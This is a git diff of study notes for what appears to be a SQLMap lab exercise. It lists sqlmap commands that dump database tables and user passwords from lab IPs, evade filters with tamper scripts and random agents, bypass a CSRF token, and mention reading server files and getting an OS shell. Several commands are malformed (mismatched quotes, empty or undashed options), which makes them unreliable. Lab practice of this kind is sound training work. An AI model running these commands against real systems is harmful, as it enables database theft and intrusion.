@@ -19,23 +19,39 @@ sqlmap -u 94.237.50.13:51001/case1.php/ -D testdb -T flag1 --batch --dump --craw
 
 ```bash
 # What's the name of the column containing "style" in it's name (Case #1)
-# sqlmap -u 94.237.50.13:51001/?id=1" --schema
-sqlmap -u "94.237.50.13:51001/case1?id=1" --search -C style --random-agent --tamper=space2comment
+# sqlmap -u "83.136.251.63:57001" --schema
+sqlmap -u "83.136.251.63:57001" --search -C style --random-agent --tamper=space2comment
 
 # What's the Kimberly user's password? (Case #1)
-sqlmap -u 94.237.63.201:36417/?id=1" --dump -D -T users
+sqlmap -u 94.237.63.201:36417" --dump users --passwords crawl=2
 ```
 
 ```bash
 # What's the contents of table flag8? (Case #8)
+sqlmap IP/case8.php -T flag8 --data="id=1&csrf-token=" --csrf-token="csrf-token" --batch --crawl=2
 
 # What's the contents of table flag9? (Case #9)
 
 # What's the contents of table flag10? (Case #10)
 
 # What's the contents of table flag11? (Case #11)
- 
+
 ```
+
+```bash
+# Try to use SQLMap to read the file "/var/www/html/flag.txt".
+
+# Use SQLMap to get an interactive OS shell on the remote host # and try to find another flag within the host.
+# The flag is in a very common directory!
+
+```
+
+```bash
+# What's the contents of the table final_flag?
+
+``` 
+
+
 
 ```bash
 # values generation 1 to 1000
